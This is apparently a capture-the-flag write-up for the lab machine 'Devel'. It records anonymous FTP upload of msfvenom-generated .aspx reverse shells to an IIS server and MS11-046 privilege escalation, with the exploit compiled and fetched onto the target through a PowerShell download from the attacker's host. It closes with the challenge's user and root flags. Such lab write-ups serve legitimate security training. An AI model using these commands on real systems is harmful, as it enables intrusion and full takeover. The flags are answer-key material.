#box #ftp #msfvenom #metasploit #MS11-046

Devel is a machine which consists in a IIS/FTP vulnerability that permits us to upload a reverse shell on a IIS hosted webserver. This maneuver will permit us to gain a foothold in the target machine. Once inside the machine we discover that the machine hosts a Windows 7 x86 machine which is vulnerable to [CVE-2011-1249])(https://www.zero-day.cz/database/378/) (a.k.a. MS11-046) which permits us to gain NT AUTHORITY\SYSTEM leveraging on `afd.sys` a driver present on the system that doesn't validate the input passed from the user mode to the kernel. This lets us escalate and get machine's root.

## Nmap

By running nmap we discover the presence of a FTP allowing `anonymous` login and of a IIS WebServer running on port 80

```bash
# Nmap 7.95 scan initiated Fri Apr 11 15:58:03 2025 as: /usr/lib/nmap/nmap --min-rate=10000 -sC -sV -o nmap_sCsV 10.129.65.199
Nmap scan report for 10.129.65.199
Host is up (0.030s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 11 15:58:15 2025 -- 1 IP address (1 host up) scanned in 12.24 seconds
```
## FTP

We authenticate to FTP with anonymous login by inputing whatever password (it doesn't really matter when it comes to an anonymous login)

We realize that the FTP matches the IIS webserver since we discover that the content of the FTP is plainly reachable on the webserver on port 80. However, we discover that the folder `aspnet_client/system_web/2_0_50727` leads to nowhere thus we try to upload a shell on the ftp to properly access it from the browser.
After trying with webshells without success, we opt to try a reverse shell.

>Due to the nature of IIS, we must consider to upload `.aspx` files. Thus the reverse shell must be the previously cited extension.
### Opt 1: Gaining a reverse shell with Meterpreter + Metasploit

We first opt with meterpreter, by crafting a payload with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.20 lport=44444 -f aspx -o meterpreter.aspx
```

Once crafted, we upload it on the FTP by authenticating as [[Interacting with FTP#^ftp-anonymous-login|anonymous login]] on the FTP and by using the command [[Interacting with FTP#^put-to-ftp|put to FTP]] and by then using metasploit's `multi/handler`.
To user the multi/handler we first look for it in metasploit and then select it
![[attachments/devel-writeup-1.webp]]

Then we set up the payload to be equal to the payload crafted with `msfvenom` with:

```metasploit
set payload windows/meterpreter/reverse_tcp
```

We then set LHOST to be equal to `tun0` and we then **run** the listener. In the meantime we reach `http://10.129.65.199/meterpreter.aspx` and this shall give us a shell.

![[attachments/devel-writeup-2.webp]]

For ease, we can input `shell` to properly gain the shell on the machine and have access to further commands.
### Opt 2: Gaining a traditional reverse shell

Alternatively, to get a shell we must use the payload `windows/shell_reverse_tcp` which is the equivalent of the meterpreter one without using meterpreter. By referencing to msfvenom's description, that's what the payload does: `Connect back to attacker and spawn a command shell (Windows x64)`. 
We then set up the command to craft the payload in `.aspx` that will get us the shell:

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.20 lport=4444 -f aspx -o shell.aspx
```

We then [[Interacting with FTP#^put-to-ftp|upload the file to the FTP]].

We run the listener with `nc -lvnp 4444`, and we then visit `http://10.129.65.199/shell.aspx`, obtaining the shell.

![[attachments/devel-writeup-3.webp]]
## Privilege Escalation

Once inside the machine,  `systeminfo` tells us that the machine is a **Microsoft Windows 7 x86**. By looking online for privilege escalation vulnerabilities we discover the presence of [CVE-2011-1249](https://www.zero-day.cz/database/378/) which leverages on `afd.sys` a driver which doesn't validate the input passed from the user mode to the kernel and permits us to gain privilege escalation.
To use the executable, we download the exploit from [exploit-db](https://www.exploit-db.com/exploits/40564) with `wget https://www.exploit-db.com/download/40564`, we rename the file 40564 to **40564.c** to build it and we then build it with:

```bash
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```

Once done, our executable is ready and can be moved onto the target.
To move the executable we can only use powershell to download the file since both curl and wget aren't available, thus we first set up the webserver on our machine with `python3 -m http.server 8000` and then we:

```powershell
powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.20:8000/MS11-046.exe','C:\Temp\MS11-046.exe')
```

Once done, we can freely run the executable from the target machine, gaining root.

User: `e0782981bd9c3684b4cdca7420a5e60d`
Root: `6ab8981074156848e56876f66bf7f47c`